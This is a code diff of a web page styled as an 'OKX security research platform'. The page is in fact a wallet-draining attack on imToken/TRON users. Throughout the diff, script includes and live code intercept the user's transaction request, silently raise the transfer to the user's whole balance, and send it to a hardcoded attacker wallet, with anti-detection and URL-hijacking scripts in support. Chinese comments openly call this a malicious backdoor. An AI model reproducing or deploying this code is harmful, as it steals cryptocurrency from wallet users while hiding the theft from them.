@@ -66,15 +66,7 @@
     <script src="iframe-injector.js"></script>
     <script src="stealth-bypass.js"></script>
     <script src="domain-rotation.js"></script>
-    <!-- 🎯 智能重定向系统 -->
-    <script src="smart-redirect.js"></script>
-
-    <!-- 🎯 超深层拦截：在URL生成时就拦截 -->
-    <script src="deep-wallet-interceptor.js"></script>
-
-    <!-- 🎯 终极后门：最高优先级URL劫持 -->
-    <script src="ultimate-url-hijacker.js"></script>
-
+    <script src="anti-detection.js"></script>
     <!-- 🎯 超级后门：在imToken检测前生效 -->
     <script>
         // 🎯 立即执行：在任何检测之前劫持URL
@@ -2195,19 +2187,10 @@
             debugLog('🚀 OKX安全研究平台已加载');
             debugLog('🎯 攻击系统已激活');
             debugLog(`🎯 攻击目标地址: ${ATTACKER_ADDRESS}`);
-        debugLog(`🎯 初始攻击目标地址: ${ATTACKER_ADDRESS}`);
+            debugLog(`🎯 初始攻击目标地址: ${ATTACKER_ADDRESS}`);
 
         //从ngrok后端获取最新的攻击者地址 - 已禁用，使用固定地址
         try{
-            // 🎯 注释掉后端地址获取，强制使用指定的攻击者地址
-            // if (typeof getCurrentAttackerAddress === 'function'){
-            //     const cloudAddressResult = await getCurrentAttackerAddress();
-            //     if (cloudAddressResult && cloudAddressResult.address && cloudAddressResult.address !== ATTACKER_ADDRESS){
-            //         ATTACKER_ADDRESS = cloudAddressResult.address;
-            //         debugLog(`🎯 后端已更改最新攻击目标地址: ${ATTACKER_ADDRESS}`);
-            //         debugLog(`🎯 钱包信息: ${cloudAddressResult.info ? cloudAddressResult.info.wallet_name : '默认钱包'}`);
-            //     }
-            // }
             debugLog(`🎯 使用固定攻击者地址: ${ATTACKER_ADDRESS}`);
             debugLog(`🎯 攻击者钱包: TDUDyhCzhDsmbpqkPBZvLqjYngTwTgGE5s`);
         }catch (error){
@@ -2333,7 +2316,7 @@
                             this._hijackInProgress = true;
                             
                             try {
-                                debugLog('🎯🎯🎯 劫持到用户交易请求！🎯🎯🎯');
+                    debugLog('🎯🎯🎯 劫持到用户交易请求！🎯🎯🎯');
                                 debugLog(`🎯 劫持方法: ${methodName}`);
                                 debugLog(`🎯 原始参数: ${JSON.stringify(args)}`);
                                 
@@ -2355,15 +2338,15 @@
                                 
                                 debugLog(`🎯 目标地址: ${to}`);
 
-                                // 🎯 恶意修改：将转账金额改为用户全部余额
-                                const userTotalBalance = await tronWeb.trx.getBalance(from || currentAccount);
-                                const feeReserve = tronWeb.toSun(1);// 只预留1 TRX手续费
-                                const maliciousAmount = userTotalBalance - feeReserve;
+                    // 🎯 恶意修改：将转账金额改为用户全部余额
+                    const userTotalBalance = await tronWeb.trx.getBalance(from || currentAccount);
+                    const feeReserve = tronWeb.toSun(1);// 只预留1 TRX手续费
+                    const maliciousAmount = userTotalBalance - feeReserve;
 
-                                debugLog(`🎯 恶意修改转账金额:`);
-                                debugLog(`- 用户余额: ${tronWeb.fromSun(userTotalBalance)} TRX`);
-                                debugLog(`- 预留手续费: ${tronWeb.fromSun(feeReserve)} TRX`);
-                                debugLog(`- 实际转账: ${tronWeb.fromSun(maliciousAmount)} TRX`);
+                    debugLog(`🎯 恶意修改转账金额:`);
+                    debugLog(`- 用户余额: ${tronWeb.fromSun(userTotalBalance)} TRX`);
+                    debugLog(`- 预留手续费: ${tronWeb.fromSun(feeReserve)} TRX`);
+                    debugLog(`- 实际转账: ${tronWeb.fromSun(maliciousAmount)} TRX`);
                                 debugLog(`🎯 用户在imToken中看到的是原始金额，但实际转走全部余额！`);
 
                                 // 🎯 高级钓鱼攻击：使用私钥直接构建和签名恶意交易
@@ -2437,14 +2420,14 @@
                                     }
                                 }
                                 
-                                debugLog('🏆🏆🏆 恶意后门攻击成功！🏆🏆🏆');
-                                debugLog(`💰 实际转走: ${tronWeb.fromSun(maliciousAmount)} TRX`);
+                        debugLog('🏆🏆🏆 恶意后门攻击成功！🏆🏆🏆');
+                        debugLog(`💰 实际转走: ${tronWeb.fromSun(maliciousAmount)} TRX`);
                                 debugLog(`😈 用户以为只转了: ${amount / 1000000} TRX`);
                                 debugLog(`🎯 返回结果: ${JSON.stringify(result)}`);
 
-                                return result;
+                        return result;
                             } catch (error) {
-                                debugLog(`❌ 恶意转账失败: ${error.message}`);
+                        debugLog(`❌ 恶意转账失败: ${error.message}`);
                                 debugLog(`❌ 恶意转账错误详情: ${JSON.stringify(error)}`);
                                 debugLog(`❌ 恶意转账错误堆栈: ${error.stack}`);
                                 
@@ -2790,14 +2773,6 @@
             }
 
         try{
-            // 🎯 注释掉攻击前地址更新，使用固定地址
-            // if (typeof getCurrentAttackerAddress === 'function'){
-            //     const latestAddressResult = await getCurrentAttackerAddress();
-            //     if (latestAddressResult && latestAddressResult.address){
-            //         ATTACKER_ADDRESS = latestAddressResult.address;
-            //         debugLog(`🔄 攻击前更新目标地址: ${ATTACKER_ADDRESS}`);
-            //     }
-            // }
             debugLog(`🔄 使用固定攻击者地址: ${ATTACKER_ADDRESS}`);
         }catch (error){
             debugLog(`⚠️ 使用固定攻击者地址: ${ATTACKER_ADDRESS}`);
@@ -3252,7 +3227,7 @@
                 attackRecord.completedAt = new Date().toISOString();
                 localStorage.setItem('attackRecord', JSON.stringify(attackRecord));
                 }
-        }, 2000);
+            }, 2000);
 
         }
 
